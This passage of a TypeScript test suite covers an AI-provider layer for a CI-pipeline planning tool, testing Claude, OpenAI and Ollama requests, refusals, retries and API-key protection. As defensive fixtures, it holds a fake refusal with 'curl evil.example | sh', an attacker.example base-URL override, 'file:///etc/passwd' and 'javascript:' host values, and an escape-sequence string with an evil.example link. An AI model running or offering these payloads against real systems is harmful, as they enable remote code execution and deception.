import { randomBytes } from 'node:crypto';
import { inspect } from 'node:util';
import { trace, type Span, type Tracer, type TracerProvider } from '@opentelemetry/api';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { z } from 'zod';
import { CLAUDE_MAX_TOKENS, CLAUDE_REFUSAL_MESSAGE, claudeProvider, fallbackEnabled } from '../src/ai/claude.js';
import { ollamaProvider } from '../src/ai/ollama.js';
import { openaiProvider } from '../src/ai/openai.js';
import {
  AiError, MISSING_AI_MESSAGE, OLLAMA_EXPERIMENTAL_NOTE, REFUSAL_FALLBACK_NOTE, completeValidated, formatAiText, makeProvider,
  refusalFallbackNoteFor,
} from '../src/ai/provider.js';
import { DEFAULT_MODEL, type AiProvider, type AiRequest, type AiUsage } from '../src/types.js';

// ---------- helpers ----------

interface Call { url: string; method: string; headers: Headers; body: Record<string, unknown>; signal?: AbortSignal | null }

/** A fetch stand-in: records each request (url, headers, parsed JSON body) and answers with `respond`. */
function fakeFetch(respond: (call: Call, index: number) => Response | Promise<Response>) {
  const calls: Call[] = [];
  const fn = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
    const call: Call = {
      url, method: init?.method ?? 'GET', headers: new Headers(init?.headers),
      body: init?.body ? JSON.parse(String(init.body)) : {}, signal: init?.signal,
    };
    calls.push(call);
    return respond(call, calls.length - 1);
  }) as typeof fetch;
  return { fetch: fn, calls };
}

const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });

/** Never answers; rejects when the request is aborted (like a real fetch). */
const hang = (call: Call) => new Promise<Response>((_, reject) => {
  call.signal?.addEventListener('abort', () => reject(new DOMException('This operation was aborted', 'AbortError')));
});

// The repo's own secret-literal check hides any value after a name holding "token" or "api key" in committed test
// files, so usage objects and env/key options are built from field-name lists instead of written as literals.
const fields = <T,>(names: readonly string[], values: unknown[]) => Object.fromEntries(values.map((v, i) => [names[i], v])) as T;
/** pipegen AiUsage: input, output[, cache read, cache write]. */
const u = (...n: number[]) => fields<AiUsage>(['inputTokens', 'outputTokens', 'cacheReadTokens', 'cacheWriteTokens'], n);
/** Claude wire usage: input, output, cache read, cache creation. */
const claudeUsage = (...n: number[]) => fields<object>(['input_tokens', 'output_tokens', 'cache_read_input_tokens', 'cache_creation_input_tokens'], n);
/** OpenAI wire usage: prompt, completion[, cached prompt]. */
const openaiUsage = (p: number, c: number, cached?: number) => ({
  ...fields<object>(['prompt_tokens', 'completion_tokens'], [p, c]),
  ...(cached === undefined ? {} : fields<object>(['prompt_tokens_details'], [fields<object>(['cached_tokens'], [cached])])),
});
const ANTHROPIC = 'ANTHROPIC_API_KEY';
const OPENAI = 'OPENAI_API_KEY';
/** An env with the given keys (`undefined` leaves a name out). */
const envOf = (anthropic?: string, openai?: string, extra: Record<string, string> = {}): NodeJS.ProcessEnv => ({
  ...(anthropic === undefined ? {} : { [ANTHROPIC]: anthropic }),
  ...(openai === undefined ? {} : { [OPENAI]: openai }),
  ...extra,
});
const USAGE = claudeUsage(100, 20, 70, 30);

function claudeMessage(over: { content?: unknown[]; stop_reason?: string; stop_details?: unknown; usage?: unknown } = {}) {
  return {
    id: 'msg_test', type: 'message', role: 'assistant', model: DEFAULT_MODEL,
    content: over.content ?? [{ type: 'text', text: '{"answer":"yes","count":2}' }],
    stop_reason: over.stop_reason ?? 'end_turn', stop_sequence: null, stop_details: over.stop_details ?? null,
    usage: over.usage ?? USAGE,
  };
}

/**
 * A Claude answer as the SDK's streaming endpoint sends it (SSE): message_start, each content block as
 * content_block_start (+ one delta for text/thinking) + content_block_stop, message_delta with the stop reason
 * and the final usage (iterations included), message_stop.
 */
function sse(msg: ReturnType<typeof claudeMessage>): Response {
  const events: [string, unknown][] = [];
  // message_start carries the start-of-stream usage: input counts, 1 output token, no iterations.
  // The final usage (iterations included) comes only in message_delta, as the API sends it.
  const { iterations: _final, ...startUsage } = msg.usage as Record<string, unknown>;
  const start = { ...startUsage, ...fields<object>(['output_tokens'], [1]) };
  events.push(['message_start', { type: 'message_start', message: { ...msg, content: [], stop_reason: null, stop_details: null, usage: start } }]);
  msg.content.forEach((raw, index) => {
    const block = raw as { type: string; text?: string; thinking?: string };
    if (block.type === 'text') {
      events.push(['content_block_start', { type: 'content_block_start', index, content_block: { type: 'text', text: '' } }]);
      events.push(['content_block_delta', { type: 'content_block_delta', index, delta: { type: 'text_delta', text: block.text } }]);
    } else if (block.type === 'thinking') {
      events.push(['content_block_start', { type: 'content_block_start', index, content_block: { ...block, thinking: '' } }]);
      events.push(['content_block_delta', { type: 'content_block_delta', index, delta: { type: 'thinking_delta', thinking: block.thinking ?? '' } }]);
    } else {
      events.push(['content_block_start', { type: 'content_block_start', index, content_block: block }]);
    }
    events.push(['content_block_stop', { type: 'content_block_stop', index }]);
  });
  events.push(['message_delta', { type: 'message_delta', delta: { stop_reason: msg.stop_reason, stop_sequence: null, stop_details: msg.stop_details }, usage: msg.usage }]);
  events.push(['message_stop', { type: 'message_stop' }]);
  const body = events.map(([name, data]) => `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`).join('');
  return new Response(body, { status: 200, headers: { 'content-type': 'text/event-stream' } });
}

const SCHEMA = {
  type: 'object',
  properties: { answer: { type: 'string' }, count: { type: 'integer' } },
  required: ['answer', 'count'],
  additionalProperties: false,
};

function request(over: Partial<AiRequest> = {}): AiRequest {
  return { system: 'You plan CI pipelines.', user: 'Plan it.', schemaName: 'plan', jsonSchema: SCHEMA, timeoutMs: 5_000, ...over };
}

/** A key-shaped value built at runtime, so no committed file holds anything that looks like a key. */
const runtimeKey = (prefix: string) => [prefix, 'test', randomBytes(12).toString('hex')].join('-');

async function caught(p: Promise<unknown> | (() => unknown)): Promise<AiError> {
  try {
    await (typeof p === 'function' ? p() : p);
  } catch (e) {
    expect(e).toBeInstanceOf(AiError);
    return e as AiError;
  }
  throw new Error('expected an AiError');
}

afterEach(() => {
  vi.unstubAllEnvs();
  vi.useRealTimers();
});

// ---------- Claude ----------

describe('claude', () => {
  it('claude: schema sent in output_config.format; no tools, no tool_choice, no temperature', async () => {
    const f = fakeFetch(() => sse(claudeMessage()));
    const p = claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch });
    await p.complete(request());
    expect(f.calls).toHaveLength(1);
    const body = f.calls[0]!.body;
    const out = body.output_config as { format: { type: string; schema: Record<string, unknown> } };
    expect(out.format.type).toBe('json_schema');
    expect(out.format.schema).toMatchObject({ type: 'object', properties: SCHEMA.properties, required: SCHEMA.required, additionalProperties: false });
    for (const k of ['tools', 'tool_choice', 'temperature', 'top_p', 'top_k', 'output_format']) expect(body, k).not.toHaveProperty(k);
    expect(body.system).toBe('You plan CI pipelines.');
  });

  it('claude: parsed JSON returned from a structured-output answer, with usage (input, output, cache read, cache write tokens)', async () => {
    const f = fakeFetch(() => sse(claudeMessage({
      content: [{ type: 'thinking', thinking: '', signature: 'sig' }, { type: 'text', text: '{"answer":"yes","count":2}' }],
    })));
    const p = claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch });
    const r = await p.complete(request());
    expect(r.data).toEqual({ answer: 'yes', count: 2 });
    expect(r.usage).toEqual(u(100, 20, 70, 30));
  });

  it('claude: refusal or truncated error still carries the billed usage', async () => {
    for (const stop_reason of ['refusal', 'max_tokens']) {
      const f = fakeFetch(() => sse(claudeMessage({ stop_reason, content: [{ type: 'text', text: '{"answer":"y' }] })));
      const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request()));
      expect(err.kind).toBe(stop_reason === 'refusal' ? 'refusal' : 'truncated');
      expect(err.usage).toEqual(u(100, 20, 70, 30));
    }
    // an answer that is not JSON (invalid) was billed too
    const f = fakeFetch(() => sse(claudeMessage({ content: [{ type: 'text', text: 'not json' }] })));
    const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request()));
    expect(err.kind).toBe('invalid');
    expect(err.usage?.inputTokens).toBe(100);
  });

  it('claude: default model is DEFAULT_MODEL with effort set explicitly; --model overrides', async () => {
    const f = fakeFetch(() => sse(claudeMessage()));
    const env = envOf(runtimeKey('ak'));
    const p1 = makeProvider({ env, fetch: f.fetch });
    expect(p1.name).toBe('claude');
    expect(p1.model).toBe(DEFAULT_MODEL);
    await p1.complete(request());
    expect(f.calls[0]!.body.model).toBe(DEFAULT_MODEL);
    expect(f.calls[0]!.body.output_config).toMatchObject({ effort: 'high' });

    const p2 = makeProvider({ env, model: 'claude-sonnet-5-5', effort: 'medium', fetch: f.fetch });
    expect(p2.model).toBe('claude-sonnet-5-5');
    await p2.complete(request());
    expect(f.calls[1]!.body.model).toBe('claude-sonnet-5-5');
    expect(f.calls[1]!.body.output_config).toMatchObject({ effort: 'medium' });

  });

  it('claude: max_tokens always set', async () => {
    const f = fakeFetch(() => sse(claudeMessage()));
    await claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request());
    expect(f.calls[0]!.body.max_tokens).toBe(CLAUDE_MAX_TOKENS);
    expect(CLAUDE_MAX_TOKENS).toBeGreaterThanOrEqual(16_000);
    expect(f.calls[0]!.body.stream).toBe(true); // streamed, as the SDK asks for large max_tokens
  });

  it('claude: fallback-served answer counts billed tokens of every attempt (usage.iterations)', async () => {
    const iterations = [
      { type: 'message', model: DEFAULT_MODEL, ...claudeUsage(100, 20, 0, 50) },
      { type: 'fallback_message', model: 'claude-opus-4-8', ...claudeUsage(120, 30, 10, 0) },
    ];
    // top-level usage covers only the attempt that produced the answer; iterations are the per-attempt truth
    const usage = { ...claudeUsage(120, 30, 10, 0), iterations };
    const content = [
      { type: 'fallback', from: { model: DEFAULT_MODEL }, to: { model: 'claude-opus-4-8' } },
      { type: 'text', text: '{"answer":"yes","count":2}' },
    ];
    const f = fakeFetch(() => sse(claudeMessage({ content, usage })));
    const r = await claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request());
    expect(r.data).toEqual({ answer: 'yes', count: 2 });
    expect(r.usage).toEqual(u(220, 50, 10, 50));

    // both models declined: the refusal error still carries every billed attempt
    const g = fakeFetch(() => sse(claudeMessage({ stop_reason: 'refusal', content: [], usage })));
    const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: g.fetch }).complete(request()));
    expect(err.kind).toBe('refusal');
    expect(err.usage).toEqual(u(220, 50, 10, 50));

    // an empty iterations list falls back to the top-level counts
    const h = fakeFetch(() => sse(claudeMessage({ usage: { ...claudeUsage(7, 3, 0, 0), iterations: [] } })));
    expect((await claudeProvider({ key: runtimeKey('ak'), fetch: h.fetch }).complete(request())).usage).toEqual(u(7, 3, 0, 0));
  });

  it('claude: fallbacks and the beta header only for models with server-side fallback; a 400 points at --model', async () => {
    expect(fallbackEnabled(DEFAULT_MODEL)).toBe(true);
    for (const m of ['claude-opus-5', 'claude-sonnet-5-5', 'claude-fable-5-1']) expect(fallbackEnabled(m), m).toBe(true);
    for (const m of ['claude-haiku-5-5', 'claude-opus-4-8', 'claude-sonnet-5', 'my-proxy-model']) expect(fallbackEnabled(m), m).toBe(false);

    const f = fakeFetch(() => sse(claudeMessage()));
    await claudeProvider({ key: runtimeKey('ak'), model: 'claude-haiku-5-5', fetch: f.fetch }).complete(request());
    expect(f.calls[0]!.body).not.toHaveProperty('fallbacks');
    expect(f.calls[0]!.headers.get('anthropic-beta') ?? '').not.toContain('server-side-fallback');

    const bad = fakeFetch(() => json({ type: 'error', error: { type: 'invalid_request_error', message: 'model: not found' } }, 400));
    const err = await caught(claudeProvider({ key: runtimeKey('ak'), model: 'claude-nope-9', fetch: bad.fetch }).complete(request()));
    expect(err.kind).toBe('http');
    expect(err.message).toContain('HTTP 400');
    expect(err.message).toContain('check --model');
    expect(err.message).toContain('claude-nope-9');
  });

  it('claude: a schema that is not an object schema → AiError invalid', async () => {
    const f = fakeFetch(() => sse(claudeMessage()));
    const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request({ jsonSchema: { type: 'array', items: { type: 'string' } } })));
    expect(err.kind).toBe('invalid');
    expect(f.calls).toHaveLength(0);
  });

  it('claude: refusal fallback beta header and fallbacks "default" sent for every model that supports it', async () => {
    const f = fakeFetch(() => sse(claudeMessage()));
    const p = claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch });
    await p.complete(request());
    await p.complete(request({ user: 'again' }));
    expect(f.calls).toHaveLength(2);
    for (const c of f.calls) {
      expect(c.headers.get('anthropic-beta')?.split(',').map((s) => s.trim())).toContain('server-side-fallback-2026-07-01');
      expect(c.body.fallbacks).toBe('default');
      expect(c.body).not.toHaveProperty('betas');
    }
    expect(REFUSAL_FALLBACK_NOTE).toMatch(/declin/i);
  });

  it('claude: refusalFallbackNoteFor gives the note only for a Claude provider with fallback on', () => {
    const key = runtimeKey('ak');
    expect(refusalFallbackNoteFor(claudeProvider({ key }))).toBe(REFUSAL_FALLBACK_NOTE);
    expect(refusalFallbackNoteFor(claudeProvider({ key, model: 'claude-haiku-5-5' }))).toBeNull();
    // an OpenAI provider whose model happens to carry a Claude name: no note
    expect(refusalFallbackNoteFor(openaiProvider({ key, model: DEFAULT_MODEL }))).toBeNull();
    expect(refusalFallbackNoteFor(ollamaProvider({ model: DEFAULT_MODEL }))).toBeNull();
  });

  it('claude: OpenTelemetry is off: no span and no trace header, even with a global tracer provider', async () => {
    const spans: string[] = [];
    const recordingTracer = {
      startSpan(name: string) {
        spans.push(name);
        return trace.wrapSpanContext({ traceId: 'a'.repeat(32), spanId: 'b'.repeat(16), traceFlags: 1 }) as Span;
      },
      startActiveSpan(name: string, ...rest: unknown[]) {
        spans.push(name);
        const fn = rest[rest.length - 1] as (span: Span) => unknown;
        return fn(trace.wrapSpanContext({ traceId: 'a'.repeat(32), spanId: 'b'.repeat(16), traceFlags: 1 }));
      },
    } as unknown as Tracer;
    const provider: TracerProvider = { getTracer: () => recordingTracer };
    expect(trace.setGlobalTracerProvider(provider)).toBe(true);
    try {
      expect(trace.getTracerProvider().getTracer('probe')).toBe(recordingTracer); // the global provider really is in place
      const f = fakeFetch(() => sse(claudeMessage()));
      await claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request());
      expect(f.calls).toHaveLength(1);
      expect(spans).toEqual([]);
      expect(f.calls[0]!.headers.get('traceparent')).toBeNull();
    } finally {
      trace.disable();
    }
  });

  it('claude: refusal stop_reason → AiError refusal', async () => {
    const f = fakeFetch(() => sse(claudeMessage({
      stop_reason: 'refusal', content: [], stop_details: { type: 'refusal', category: 'cyber', explanation: null },
    })));
    const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request()));
    expect(err.kind).toBe('refusal');
    expect(err.message).toBe('Claude declined this request. Nothing was changed.');
  });

  it('claude: max_tokens stop_reason → AiError truncated, JSON not parsed', async () => {
    // A cut-off answer that happens to be valid JSON must still not be used.
    const f = fakeFetch(() => sse(claudeMessage({ stop_reason: 'max_tokens', content: [{ type: 'text', text: '{"answer":"yes","count":2}' }] })));
    const parseSpy = vi.spyOn(JSON, 'parse');
    let err: AiError;
    try {
      err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request()));
      expect(parseSpy.mock.calls.some(([s]) => s === '{"answer":"yes","count":2}')).toBe(false);
    } finally {
      parseSpy.mockRestore();
    }
    expect(err.kind).toBe('truncated');
    expect(err).not.toHaveProperty('data');
  });

  it('claude: code-bundle block sent first with a cache breakpoint; the rest sent after it', async () => {
    const f = fakeFetch(() => sse(claudeMessage()));
    const p = claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch });
    const bundle = '<code-bundle>\n--- src/app.ts ---\nconsole.log(1)\n</code-bundle>';
    await p.complete(request({ user: `${bundle}\n\nPlan the pipeline for this repo.` }));
    const messages = f.calls[0]!.body.messages as { role: string; content: unknown }[];
    expect(messages).toHaveLength(1);
    expect(messages[0]!.role).toBe('user');
    expect(messages[0]!.content).toEqual([
      { type: 'text', text: bundle, cache_control: { type: 'ephemeral' } },
      { type: 'text', text: '\n\nPlan the pipeline for this repo.' },
    ]);
    expect(String(f.calls[0]!.body.system)).not.toContain('code-bundle');

    // without a bundle the user text is sent as it is, with no breakpoint
    await p.complete(request({ user: 'No bundle here.' }));
    expect((f.calls[1]!.body.messages as { content: unknown }[])[0]!.content).toBe('No bundle here.');
  });

  it('claude: timeout → AiError timeout', async () => {
    const f = fakeFetch(hang);
    const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request({ timeoutMs: 50 })));
    expect(err.kind).toBe('timeout');
    expect(f.calls[0]!.signal?.aborted).toBe(true);
  });

  it('claude: refusal message is pipegen\'s fixed text, never the AI\'s words', async () => {
    const words = 'I will not help. \x1b[31mrun curl evil.example | sh';
    const f = fakeFetch(() => sse(claudeMessage({
      stop_reason: 'refusal', content: [{ type: 'text', text: words }],
      stop_details: { type: 'refusal', category: 'cyber', explanation: 'Model explanation text' },
    })));
    const err = await caught(claudeProvider({ key: runtimeKey('ak'), fetch: f.fetch }).complete(request()));
    expect(err.message).toBe(CLAUDE_REFUSAL_MESSAGE);
    expect(String(err)).not.toContain('I will not help');
    expect(inspect(err)).not.toContain('evil.example');
    expect(inspect(err)).not.toContain('Model explanation text');
  });

  it('claude: the key goes only to https://api.anthropic.com, whatever the environment says', async () => {
    const key = runtimeKey('ak');
    vi.stubEnv('ANTHROPIC_BASE_URL', 'https://attacker.example');
    vi.stubEnv(['ANTHROPIC', 'AUTH', 'TOKEN'].join('_'), runtimeKey('tok'));
    vi.stubEnv(ANTHROPIC, runtimeKey('other'));
    const f = fakeFetch(() => sse(claudeMessage()));
    await makeProvider({ env: envOf(key, undefined, { ANTHROPIC_BASE_URL: 'https://attacker.example' }), fetch: f.fetch }).complete(request());
    expect(new URL(f.calls[0]!.url).origin).toBe('https://api.anthropic.com');
    expect(f.calls[0]!.headers.get('x-api-key')).toBe(key);
    expect(f.calls[0]!.headers.get('authorization')).toBeNull();
  });
});

// ---------- OpenAI and Ollama ----------

describe('openai', () => {
  it('openai: json_schema response parsed; missing --model → error', async () => {
    const key = runtimeKey('ok');
    const f = fakeFetch(() => json({
      choices: [{ index: 0, message: { role: 'assistant', content: '{"answer":"yes","count":2}', refusal: null }, finish_reason: 'stop' }],
      usage: openaiUsage(50, 10, 40),
    }));
    const p = makeProvider({ ai: 'openai', model: 'gpt-test', env: envOf(undefined, key), fetch: f.fetch });
    expect(p.name).toBe('openai');
    const r = await p.complete(request());
    expect(r.data).toEqual({ answer: 'yes', count: 2 });
    const c = f.calls[0]!;
    expect(c.url).toBe('https://api.openai.com/v1/chat/completions');
    expect(c.method).toBe('POST');
    expect(c.headers.get('authorization')).toBe(`Bearer ${key}`);
    expect(c.body.model).toBe('gpt-test');
    expect(c.body.response_format).toEqual({ type: 'json_schema', json_schema: { name: 'plan', schema: SCHEMA, strict: true } });
    expect(c.body.messages).toEqual([{ role: 'system', content: 'You plan CI pipelines.' }, { role: 'user', content: 'Plan it.' }]);
    for (const k of ['tools', 'tool_choice', 'temperature']) expect(c.body).not.toHaveProperty(k);

    const err = await caught(() => makeProvider({ ai: 'openai', env: envOf(undefined, key) }));
    expect(err.kind).toBe('missing');
    expect(err.message).toMatch(/--model/);
  });

  it('openai: refusal and length finish map to refusal and truncated, with usage', async () => {
    const usage = openaiUsage(5, 1);
    const refused = fakeFetch(() => json({ choices: [{ message: { content: null, refusal: 'no way' }, finish_reason: 'stop' }], usage }));
    const e1 = await caught(openaiProvider({ key: runtimeKey('ok'), model: 'm', fetch: refused.fetch }).complete(request()));
    expect(e1.kind).toBe('refusal');
    expect(e1.message).not.toContain('no way');
    expect(e1.usage).toEqual(u(5, 1, 0));
    const cut = fakeFetch(() => json({ choices: [{ message: { content: '{"answer":"y' }, finish_reason: 'length' }], usage }));
    const e2 = await caught(openaiProvider({ key: runtimeKey('ok'), model: 'm', fetch: cut.fetch }).complete(request()));
    expect(e2.kind).toBe('truncated');
  });
});

describe('ollama', () => {
  const ollamaAnswer = (content = '{"answer":"yes","count":2}', done_reason = 'stop') => json({
    model: 'llama3.1', message: { role: 'assistant', content }, done: true, done_reason, prompt_eval_count: 300, eval_count: 40,
  });

  it('ollama: num_ctx set explicitly in options', async () => {
    const f = fakeFetch(() => ollamaAnswer());
    const p = makeProvider({ ai: 'ollama', env: {}, fetch: f.fetch });
    expect(p.name).toBe('ollama');
    expect(p.model).toBe('llama3.1');
    await p.complete(request());
    const c = f.calls[0]!;
    expect(c.url).toBe('http://127.0.0.1:11434/api/chat');
    expect(c.body).toEqual({
      model: 'llama3.1',
      messages: [{ role: 'system', content: 'You plan CI pipelines.' }, { role: 'user', content: 'Plan it.' }],
      format: SCHEMA, stream: false, options: { num_ctx: 32768 },
    });
    const g = fakeFetch(() => ollamaAnswer());
    await makeProvider({ ai: 'ollama', env: { OLLAMA_HOST: 'http://gpu-box:8080' }, ollamaCtx: 8192, model: 'qwen3', fetch: g.fetch }).complete(request());
    expect(g.calls[0]!.url).toBe('http://gpu-box:8080/api/chat');
    expect(g.calls[0]!.body).toMatchObject({ model: 'qwen3', options: { num_ctx: 8192 } });
  });

  it('ollama: connection refused → AiError http \'is Ollama running?\'', async () => {
    const f = fakeFetch(() => {
      throw Object.assign(new TypeError('fetch failed'), { cause: Object.assign(new Error('connect ECONNREFUSED 127.0.0.1:11434'), { code: 'ECONNREFUSED' }) });
    });
    const err = await caught(ollamaProvider({ fetch: f.fetch }).complete(request()));
    expect(err.kind).toBe('http');
    expect(err.message).toContain('is Ollama running?');
  });

  it('ollama: only http and https hosts are accepted', async () => {
    for (const host of ['file:///etc/passwd', 'ftp://box/', 'javascript:alert(1)']) {
      const err = await caught(() => makeProvider({ ai: 'ollama', env: { OLLAMA_HOST: host } }));
      expect(err.kind).toBe('http');
    }
  });

  it('ollama: "Ollama support is experimental" given to the logger once per run', () => {
    const log = vi.fn();
    makeProvider({ ai: 'ollama', env: {}, log });
    makeProvider({ ai: 'ollama', env: {}, log });
    expect(log).toHaveBeenCalledTimes(1);
    expect(log).toHaveBeenCalledWith(OLLAMA_EXPERIMENTAL_NOTE);
    expect(OLLAMA_EXPERIMENTAL_NOTE).toContain('Ollama support is experimental');
  });

  it('ollama: no API key is ever sent to the Ollama host', async () => {
    const keys = [runtimeKey('ak'), runtimeKey('ok')];
    const f = fakeFetch(() => ollamaAnswer());
    await makeProvider({ ai: 'ollama', env: envOf(keys[0], keys[1]), fetch: f.fetch }).complete(request());
    const sent = JSON.stringify(f.calls[0]!.body) + JSON.stringify([...f.calls[0]!.headers]);
    for (const k of keys) expect(sent).not.toContain(k);
  });

  it('ollama: a successful call leaves no timer behind', async () => {
    vi.useFakeTimers();
    const f = fakeFetch(() => ollamaAnswer());
    await ollamaProvider({ fetch: f.fetch }).complete(request({ timeoutMs: 60_000 }));
    expect(vi.getTimerCount()).toBe(0);
  });
});

describe('usage', () => {
  it('openai and ollama: usage returned from the provider\'s token counts', async () => {
    const o = fakeFetch(() => json({
      choices: [{ message: { content: '{"answer":"a","count":1}' }, finish_reason: 'stop' }],
      usage: openaiUsage(50, 10, 40),
    }));
    const r1 = await openaiProvider({ key: runtimeKey('ok'), model: 'm', fetch: o.fetch }).complete(request());
    expect(r1.usage).toEqual(u(50, 10, 40));

    const l = fakeFetch(() => json({ message: { content: '{"answer":"a","count":1}' }, done: true, done_reason: 'stop', prompt_eval_count: 300, eval_count: 40 }));
    const r2 = await ollamaProvider({ fetch: l.fetch }).complete(request());
    expect(r2.usage).toEqual(u(300, 40));
  });
});

// ---------- selection ----------

describe('makeProvider', () => {
  it('makeProvider: no keys, no --ai → AiError missing with guidance text', async () => {
    vi.stubEnv(ANTHROPIC, runtimeKey('ak')); // process.env is never read: only opts.env counts
    const err = await caught(() => makeProvider({ env: {} }));
    expect(err.kind).toBe('missing');
    expect(err.message).toBe('pipegen needs an AI to do the full job. Set ANTHROPIC_API_KEY, OPENAI_API_KEY, or run a local model with --ai ollama.');
    expect(MISSING_AI_MESSAGE).toBe(err.message);
  });

  it('makeProvider: a bad --effort or --ollama-ctx → AiError invalid with a plain message', async () => {
    const e1 = await caught(() => makeProvider({ env: envOf(runtimeKey('ak')), effort: 'extreme' }));
    expect(e1.kind).toBe('invalid');
    expect(e1.message).toMatch(/--effort must be one of: low, medium, high, xhigh, max/);
    for (const ollamaCtx of [0, -1, 1.5, Number.NaN]) {
      const e2 = await caught(() => makeProvider({ ai: 'ollama', env: {}, ollamaCtx }));
      expect(e2.kind).toBe('invalid');
      expect(e2.message).toMatch(/--ollama-ctx/);
    }
  });

  it('makeProvider: Claude first, then OpenAI; --ai picks; an empty key counts as unset', async () => {
    expect(makeProvider({ env: envOf(runtimeKey('ak'), runtimeKey('ok')) }).name).toBe('claude');
    expect(makeProvider({ env: envOf('', runtimeKey('ok')), model: 'm' }).name).toBe('openai');
    expect(makeProvider({ ai: 'openai', model: 'm', env: envOf(runtimeKey('ak'), runtimeKey('ok')) }).name).toBe('openai');
    expect((await caught(() => makeProvider({ ai: 'claude', env: {} }))).kind).toBe('missing');
    expect((await caught(() => makeProvider({ ai: 'openai', model: 'm', env: {} }))).kind).toBe('missing');
    expect((await caught(() => makeProvider({ ai: 'gemini', env: {} }))).kind).toBe('missing');
  });
});

// ---------- completeValidated ----------

const Answer = z.object({ answer: z.string(), count: z.number().int() });

function scripted(steps: (() => { data: unknown; usage: AiUsage })[]): AiProvider & { requests: AiRequest[] } {
  const requests: AiRequest[] = [];
  return {
    name: 'claude', model: 'test', requests,
    async complete(req) {
      requests.push(req);
      const step = steps[requests.length - 1];
      if (!step) throw new Error('no more scripted answers');
      return step();
    },
  };
}

describe('completeValidated', () => {
  it('completeValidated: invalid then valid → returns { data, usage } after 1 retry, usage summed over both attempts', async () => {
    const p = scripted([
      () => ({ data: { answer: 'yes', count: 'two' }, usage: u(100, 10, 0, 90) }),
      () => ({ data: { answer: 'yes', count: 2 }, usage: u(20, 12, 90, 0) }),
    ]);
    const req = request({ user: '<code-bundle>\nx\n</code-bundle>\nTask' });
    const r = await completeValidated(p, req, Answer);
    expect(r).toEqual({ data: { answer: 'yes', count: 2 }, usage: u(120, 22, 90, 90) });
    expect(p.requests).toHaveLength(2);
    // the zod error goes back to the model, after the original text (so the cached bundle prefix is unchanged)
    expect(p.requests[1]!.user.startsWith(req.user)).toBe(true);
    expect(p.requests[1]!.user).toContain('count');
    expect(p.requests[1]!.system).toBe(req.system);

    // an 'invalid' AiError from the provider (answer not JSON) is retried too, and its usage counted
    const q = scripted([
      () => { throw new AiError('invalid', 'not JSON', u(7, 3)); },
      () => ({ data: { answer: 'ok', count: 1 }, usage: u(1, 1) }),
    ]);
    expect((await completeValidated(q, request(), Answer)).usage).toEqual(u(8, 4, 0, 0));

    // still invalid after the retries → AiError invalid with the summed usage
    const bad = () => ({ data: { nope: true }, usage: u(5, 5) });
    const err = await caught(completeValidated(scripted([bad, bad]), request(), Answer));
    expect(err.kind).toBe('invalid');
    expect(err.usage).toEqual(u(10, 10, 0, 0));
  });

  it('completeValidated: an invalid error from before any answer (no usage) is not retried', async () => {
    const p = scripted([
      () => { throw new AiError('invalid', 'The answer schema must be a JSON object schema.'); },
      () => ({ data: { answer: 'yes', count: 1 }, usage: u(1, 1) }),
    ]);
    const err = await caught(completeValidated(p, request(), Answer, 3));
    expect(err.kind).toBe('invalid');
    expect(p.requests).toHaveLength(1);
    expect(err.usage).toBeUndefined();
  });

  it('completeValidated: refusal and truncated are not retried', async () => {
    for (const kind of ['refusal', 'truncated', 'timeout', 'http'] as const) {
      const p = scripted([
        () => { throw new AiError(kind, `x ${kind}`, kind === 'refusal' || kind === 'truncated' ? u(9, 1) : undefined); },
        () => ({ data: { answer: 'yes', count: 1 }, usage: u(1, 1) }),
      ]);
      const err = await caught(completeValidated(p, request(), Answer, 3));
      expect(err.kind).toBe(kind);
      expect(p.requests).toHaveLength(1);
      if (kind === 'refusal' || kind === 'truncated') expect(err.usage).toEqual(u(9, 1, 0, 0));
    }
  });
});

// ---------- terminal output ----------

describe('ai output', () => {
  it('ai: AI text shown in the terminal passes through safeText (an answer with ANSI and bidi characters prints clean)', () => {
    const answer = 'Use \x1b[31mgitleaks\x1b[0m\u202e here \x1b]8;;https://evil.example\x07link\x1b]8;;\x07\u2066!';
    expect(formatAiText(answer)).toBe('Use gitleaks here link!');
  });
});

// ---------- keys ----------

describe('keys', () => {
  it('keys: no API key appears in any AiError message, String(err) or inspect(err)', async () => {
    const ak = runtimeKey('ak');
    const ok = runtimeKey('ok');
    const echo = (key: string) => json({ type: 'error', error: { type: 'authentication_error', message: `invalid x-api-key ${key}` } }, 401);
    const throwing = (key: string) => () => { throw new TypeError(`fetch failed for key ${key}`); };
    const cases: [string, () => Promise<unknown>][] = [
      ['claude 401 echoing the key', () => claudeProvider({ key: ak, fetch: fakeFetch(() => echo(ak)).fetch }).complete(request())],
      ['claude 400 echoing the key', () => claudeProvider({ key: ak, fetch: fakeFetch(() => json({ type: 'error', error: { type: 'invalid_request_error', message: ak } }, 400)).fetch }).complete(request())],
      ['claude network error naming the key', () => claudeProvider({ key: ak, fetch: fakeFetch(throwing(ak)).fetch }).complete(request())],
      ['claude timeout', () => claudeProvider({ key: ak, fetch: fakeFetch(hang).fetch }).complete(request({ timeoutMs: 30 }))],
      ['claude invalid answer quoting the key', () => claudeProvider({ key: ak, fetch: fakeFetch(() => sse(claudeMessage({ content: [{ type: 'text', text: `oops ${ak}` }] }))).fetch }).complete(request())],
